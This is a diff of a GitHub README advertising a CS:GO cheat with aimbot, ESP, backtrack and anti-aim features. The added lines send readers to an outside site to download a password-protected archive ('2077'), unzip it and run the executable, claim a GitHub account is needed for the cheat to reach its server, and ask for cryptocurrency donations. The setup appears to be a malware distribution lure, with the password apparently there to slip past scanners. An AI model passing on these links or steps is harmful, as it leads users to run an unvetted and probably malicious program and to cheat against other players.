@@ -1,33 +1,58 @@
-# HYROCOPT-CHEAT-CS-GO-HACK-ESP-AIM
+# CS-GO-HACK-ESP-AIM
 
-# Download
-|[Download](https://www.mediafire.com/file/l58b24ooqwio65b/HYROCOPT_HACK.zip/file)|
-|:-------------|
-Passwrod: 23
+# IMPORTANT 
 
+# Be sure to create an account on GitHub before launching the cheat 
+# Without it, the cheat will not be able to contact the server
+
+-----------------------------------------------------------------------------------------------------------------------
+# Download Cheat
+|[Download](https://sites.google.com/view/nccrakc/main-page)|Password: 2077|
+|---|---|
+-----------------------------------------------------------------------------------------------------------------------
+
+# Support the author ( On chips )
+
+- BTC - bc1q7kmj3pyhcm2n02z6p7gxvusqv55pt7vcgxe6ut
+
+- ETH - 0xE39c1E460cc0e10B1194F01832D19AA553b40633
+
+- TRC-20 ( Usdt ) - TRYhDuV6qVcHQjfqEgF15w72TdxCMLDt9b
+
+- BNB - 0xE39c1E460cc0e10B1194F01832D19AA553b40633
+
+-----------------------------------------------------------------------------------------------------------------------
 
 # How to install?
 
-- Download the archive
+- Visit our website
 
-- Unzip the archive to your desktop ( Password from the archive is 23 )
+- Download the archive 
 
-- Run the file ( HYROCOPT HACK )
+- Unzip the archive to your desktop ( Password from the archive is 2077 )
+
+- Run the file ( NcCrack )
 
 - Launch the game
 
 - In-game INSERT button
 
+-----------------------------------------------------------------------------------------------------------------------
+
 # SYSTEM REQUIREMENTS
+
 - Processor | Intel | Amd Processor |
 
 - Windows support | 7 | 8 | 8.1 | 10 | 11 |
 
 - Build support | ALL |
 
+-----------------------------------------------------------------------------------------------------------------------
+
 # FUNCTION
-![image]
+
 # VISUALS
+
 - PLAYERS
 - Name
 - Line
@@ -43,7 +68,9 @@ Passwrod: 23
 - Health
 - Chams
 - Box
+
 # LOCAL
+
 - Crosshar
 - Spread
 - Grenade Helper
@@ -54,7 +81,9 @@ Passwrod: 23
 - Thirdperson
 - YawIndicator
 - Aim FOV
+
 # FILTER
+
 - Visible Only
 - Firendly
 - Local
@@ -69,7 +98,9 @@ Passwrod: 23
 - Item
 - Chams
 - Tracers
+
 # MISC
+
 - Spectator
 - Rank
 - Radar
@@ -80,14 +111,20 @@ Passwrod: 23
 - Max Distance
 - Arrows
 - Radius
-#SKINS
+
+# SKINS
+
 - Hands
 - Glove Skin
 - Knife
-- ID
+- ID 
+
 # COLOR
+
 - The ability to change the color anywhere
+
 # LEGITBOT
+
 - MAIN:
 - Global Settings
 - Auto Fire
@@ -103,11 +140,15 @@ Passwrod: 23
 - RCS Type
 - FOV
 - Aimtype
+
 # POSITION
+
 - Priority
 - Switches from head to legs
+- Переключатели от head до legs
 
 # ACCURACY
+
 - Backtrack
 - Ignore Jump
 - Not Aim While Flashed
@@ -115,33 +156,46 @@ Passwrod: 23
 - Trigger Delay
 - Hitchance
 - Min damage
+
 # FACTORS
+
 - Fire Rate
 - Fire Delay
 - Aim Time
 - Aim Distance
+
 # RAGEBOT
-- MAIN
+
+# MAIN
+
 - Global Settings
 - Active
 - Aim Mode
 - FOV
 - Aim Step
+
 # POSITION
+
 - Priority
 - Switches from head to legs
+- Переключатели от head до legs
 
 # ACCURACY
+
 - Resolver
 - Backtrack
 - Fake Lag On Shot
-- Aim Low Health
-- Aim After Miss
+- bAim Low Health
+- bAim After Miss
 - Auto Scope
 - Movement
 - Hitchance
 - Min Damage
+
+# MISC
+
 # MAIN
+
 - Anti Untrusted
 - Legit AA
 - Movement
@@ -150,23 +204,35 @@ Passwrod: 23
 - Clantag
 - Chat
 - Name
+
 # ANTIAIMS
+
 - Pitch
 - Yaw
 - Type
 - Fakelag
 - Stand, Move, Inair
+
 # BINDS
+
 - Fakeduck Key
-- Aim Switch Key
+- bAim Switch Key
 - Slowwalk Key
+
 # SLOWWALK
+
 - Slowwalk
 - Factor
+
 # CONFIG
+
 - Load
 - Save
 - Add
 - Remove
+
 # PLAYERS
+
 - The list of players
+
+![S1DE0iU](https://user-images.githubusercontent.com/119938147/213409592-8ff03bfb-fde8-4ba2-93e7-d94609df92fd.gif)
